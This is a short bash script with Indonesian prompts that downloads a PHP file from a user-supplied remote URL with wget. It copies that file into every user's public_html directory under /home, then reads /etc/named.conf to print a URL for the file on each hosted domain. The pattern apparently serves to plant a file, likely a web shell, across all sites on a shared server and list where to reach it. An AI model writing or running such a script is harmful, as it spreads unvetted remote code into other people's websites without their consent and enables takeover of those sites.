#!/bin/bash

# Meminta nama file yang akan disalin ke semua domain
read -p "Masukkan nama file PHP (misalnya: bps.php): " file_to_upload

# Meminta URL sumber file (RAW link)
read -p "Masukkan URL file PHP (RAW_URL): " REMOTE_URL

# Unduh file ke lokal
if wget -q "$REMOTE_URL" -O "$file_to_upload"; then
    echo "✅ File berhasil diunduh: $file_to_upload"
else
    echo "❌ Gagal mengunduh file dari $REMOTE_URL"
    exit 1
fi

# Iterate through user directories in /home and upload file
for user_dir in /home/*/public_html; do
    if [ -d "$user_dir" ]; then
        # Upload file to public_html directory if exists
        cp "$file_to_upload" "$user_dir/"
        echo "File uploaded to $user_dir/"
    fi
done

while IFS= read -r line; do
    if [[ "$line" =~ zone[[:space:]]+\"([^\"]+)\"[[:space:]]*\{ ]]; then
        domain="${BASH_REMATCH[1]}"
        echo "https://$domain/$file_to_upload"
    fi
done < /etc/named.conf
